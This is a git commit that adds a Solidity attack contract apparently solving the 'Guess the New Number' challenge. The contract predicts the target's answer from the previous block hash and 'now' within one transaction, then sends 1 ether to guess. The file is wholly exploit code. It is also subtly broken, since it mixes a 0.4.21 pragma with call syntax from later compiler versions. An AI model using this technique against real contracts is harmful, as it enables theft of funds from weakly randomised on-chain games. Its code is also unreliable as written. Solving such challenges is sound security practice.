1169c589301a296ad104d18ea872a16ba451ca41
JMariadlcs <jmariadelacruzsanchez@gmail.com>
2023-02-11 12:28:43 +0100

    NewN

---
+++ Lotteries/GuessTheNewNumberChallenge/Attack.sol
@@ -0,0 +1,17 @@
+pragma solidity ^0.4.21;
+
+import "./GuessTheNewNumberChallenge.sol";
+
+contract Attack {
+
+    GuessTheNewNumberChallenge target;
+
+    function Attack(address _targetAddress) public {
+        target = GuessTheNewNumberChallenge(_targetAddress);
+    }
+
+    function _attack() external payable {
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        target.guess{value: 1 ether}(answer);
+    }
+}
